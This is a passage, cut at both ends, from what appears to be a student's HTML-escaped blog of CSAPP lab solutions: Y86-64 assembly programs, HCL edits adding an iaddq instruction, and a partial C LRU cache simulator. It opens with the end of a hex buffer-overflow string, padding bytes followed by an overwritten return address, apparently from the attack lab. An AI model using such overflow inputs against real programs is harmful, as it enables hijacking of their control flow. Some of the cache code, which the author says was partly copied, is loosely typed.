61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61

62 62 62 62
48 3b 68 55
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;lab5-arch-lab&#34;&gt;Lab5 Arch-lab&lt;/h2&gt;
&lt;h3 id=&#34;part-a&#34;&gt;Part A&lt;/h3&gt;
&lt;p&gt;第一部分是使用 Y64 语言写几个程序&lt;/p&gt;
&lt;p&gt;写的不规范，能跑就行&lt;/p&gt;
&lt;p&gt;sum.ys&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-y64&#34; data-lang=&#34;y64&#34;&gt;    .pos 0
init:
    irmovq Stack, %rsp
    call Main
    halt

Main:
    irmovq ele1, %rdi
    call Sum
    ret

Sum:
    xorq %rax, %rax
    rrmovq %rdi, %rcx
  loop:
    andq %rcx, %rcx
    je end
    mrmovq 0(%rcx), %rbx
    addq %rbx, %rax
    mrmovq 8(%rcx), %rcx
    jmp loop
  end:
    ret

# Sample linked list
.align 8
ele1:
.quad 0x00a
.quad ele2
ele2:
.quad 0x0b0
.quad ele3
ele3:
.quad 0xc00
.quad 0

    .pos 0x200
Stack:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;rsum.ys&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-y64&#34; data-lang=&#34;y64&#34;&gt;    .pos 0
init:
    irmovq Stack, %rsp
    call Main
    halt

Main:
    irmovq ele1, %rdi
    xorq %rax, %rax
    call rsum_list
    ret

rsum_list:
  loop:
    andq %rdi, %rdi
    je end
    mrmovq 0(%rdi), %rbx
    pushq %rbx
    mrmovq 8(%rdi), %rdi
    call rsum_list
    popq %rbx
    addq %rbx, %rax
    jmp loop
  end:
    ret

# Sample linked list
.align 8
ele1:
.quad 0x00a
.quad ele2
ele2:
.quad 0x0b0
.quad ele3
ele3:
.quad 0xc00
.quad 0

    .pos 0x200
Stack:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;copy.ys&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-y64&#34; data-lang=&#34;y64&#34;&gt;    .pos 0
init:
    irmovq Stack, %rsp
    call Main
    halt

Main:
    irmovq src, %rdi
    irmovq dest, %rsi
    irmovq $3, %rdx
    call copy
    ret

copy:
    irmovq $1, %r8
    irmovq $8, %r9
    xorq %rax, %rax
    rrmovq %rdx, %rcx
  loop:
    mrmovq 0(%rdi), %rbx
    rmmovq %rbx, 0(%rsi)
    xorq %rbx, %rax
    addq %r9, %rdi
    addq %r9, %rsi
    subq %r8, %rcx
    andq %rcx, %rcx
    jne loop
    ret

# Sample linked list
.align 8
# Source block
src:
.quad 0x00a
.quad 0x0b0
.quad 0xc00
# Destination block
dest:
.quad 0x111
.quad 0x222
.quad 0x333

    .pos 0x200
Stack:
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;part-b&#34;&gt;Part B&lt;/h3&gt;
&lt;p&gt;这部分不太会，全靠注释和网上资料做的&lt;/p&gt;
&lt;p&gt;参考书上的相似指令，自己画了个整体架构&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#############################################
#     Stage    # iaddq V, rB                #
#############################################
#              # icode: ifun &amp;lt;- M_1[PC]     #
# Fetch Stage  # rA: rB      &amp;lt;- M_1[PC + 1] #
#              # valC        &amp;lt;- M_8[PC + 2] #
#              # valP        &amp;lt;- PC + 10     #
#############################################
# Decode Stage # valB &amp;lt;- R[rB]              #
#############################################
# Excuse Stage # valE &amp;lt;- valC + valB        #
#############################################
#   Writeback  #                            #
#     Stage    # R[rB] &amp;lt;- valE              #
#############################################
#   Update PC  # PC &amp;lt;- valP                 #
#############################################
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Fetch 阶段&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Determine instruction code
word icode = [
	imem_error: INOP;
	1: imem_icode;		# Default: get from instruction memory
];

# Determine instruction function
word ifun = [
	imem_error: FNONE;
	1: imem_ifun;		# Default: get from instruction memory
];

bool instr_valid = icode in 
	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ };

# Does fetched instruction require a regid byte?
bool need_regids =
	icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, 
		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ};

# Does fetched instruction require a constant word?
bool need_valC =
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ };
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Decode 阶段&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;## What register should be used as the A source?
word srcA = [
	icode in { IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  } : rA;
	icode in { IPOPQ, IRET } : RRSP;
	1 : RNONE; # Don&#39;t need register
];

## What register should be used as the B source?
word srcB = [
	icode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  } : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don&#39;t need register
];

## What register should be used as the E destination?
word dstE = [
	icode in { IRRMOVQ } &amp;amp;&amp;amp; Cnd : rB;
	icode in { IIRMOVQ, IOPQ, IIADDQ} : rB;
	icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;
	1 : RNONE;  # Don&#39;t write any register
];

## What register should be used as the M destination?
word dstM = [
	icode in { IMRMOVQ, IPOPQ } : rA;
	1 : RNONE;  # Don&#39;t write any register
];
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Execute 阶段&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;## Select input A to ALU
word aluA = [
	icode in { IRRMOVQ, IOPQ } : valA;
	icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : valC;
	icode in { ICALL, IPUSHQ } : -8;
	icode in { IRET, IPOPQ } : 8;
	# Other instructions don&#39;t need ALU
];

## Select input B to ALU
word aluB = [
	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, 
		      IPUSHQ, IRET, IPOPQ, IIADDQ } : valB;
	icode in { IRRMOVQ, IIRMOVQ } : 0;
	# Other instructions don&#39;t need ALU
];

## Set the ALU function
word alufun = [
	icode == IOPQ : ifun;
	1 : ALUADD;
];

## Should the condition codes be updated?
bool set_cc = icode in { IOPQ, IIADDQ };
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PC 更新阶段不需要更改&lt;/p&gt;
&lt;h2 id=&#34;lab7-cache-lab&#34;&gt;Lab7 Cache-lab&lt;/h2&gt;
&lt;p&gt;需要实现一个 LRU 的 Cache 系统&lt;/p&gt;
&lt;p&gt;不知道该怎么实现，直接逆 &lt;code&gt;csim-ref&lt;/code&gt; 加抄网上资料了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;getopt.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;cachelab.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, v &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tracefile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, B &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; hit_count, miss_count, eviction_count;
&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lru_counter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, set_index_mask;


FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;

&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; valid_bit;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; tag;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lru;
} cache_line_t, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cache_set_t, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;cache_t;

cache_t cache;

&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {

} Node;

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;printUsage&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;name){
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./%s [-hv] -s &amp;lt;s&amp;gt; -E &amp;lt;E&amp;gt; -b &amp;lt;b&amp;gt; -t &amp;lt;tracefile&amp;gt;&amp;#34;&lt;/span&gt;, name);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Options:&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -h         Print this help message.&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -v         Optional verbose flag.&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -s &amp;lt;num&amp;gt;   Number of set index bits.&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -E &amp;lt;num&amp;gt;   Number of lines per set.&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -b &amp;lt;num&amp;gt;   Number of block offset bits.&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -t &amp;lt;file&amp;gt;  Trace file.&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Examples:&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  linux&amp;gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  linux&amp;gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace&amp;#34;&lt;/span&gt;);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;initCache&lt;/span&gt;() {
    cache &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (cache_t)malloc(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(cache_set_t) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; S);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; S; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        cache[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (cache_set_t)malloc(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(cache_line_t) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; E);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; E; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            cache[i][j].valid_bit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
            cache[i][j].tag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
            cache[i][j].lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }
    }
    set_index_mask &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; s) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;releaseCache&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; S; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        free(cache[i]);
        cache[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    }
    free(cache);
    cache &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;accessData&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; address){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; eviction_lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; eviction_line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; tag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; address &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (s &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b);
    cache_set_t cache_set &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cache[(address &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; set_index_mask];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; E) {
            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;miss_count;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v)
                printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;miss &amp;#34;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; E; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;j) {
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cache_set[j].lru &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; eviction_lru) {
                    eviction_line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j;
                    eviction_lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cache_set[j].lru;
                }
            }
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cache_set[eviction_line].valid_bit) {
                &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;eviction_count;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v) 
                    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eviction &amp;#34;&lt;/span&gt;);
            }
            cache_set[eviction_line].valid_bit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
            cache_set[eviction_line].tag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tag;
            cache_set[eviction_line].lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lru_counter&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cache_set[i].valid_bit &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cache_set[i].tag &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; tag) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        }
    }
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;hit_count;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v) 
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hit &amp;#34;&lt;/span&gt;);
    cache_set[i].lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lru_counter&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replayTrace&lt;/span&gt;(FILE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; address;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; size;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (fgets(buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;1023&lt;/span&gt;, f)) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;L&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;S&amp;#39;&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;
        }
        sscanf(buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%llx,%u &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;address, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v)
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%c %llx,%u &amp;#34;&lt;/span&gt;, buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], address, size);
        accessData(address);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;) {
            accessData(address);
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v) putchar(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; argv[]) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; o;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((o &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getopt(argc, argv, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hvs:E:b:t:&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (o) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
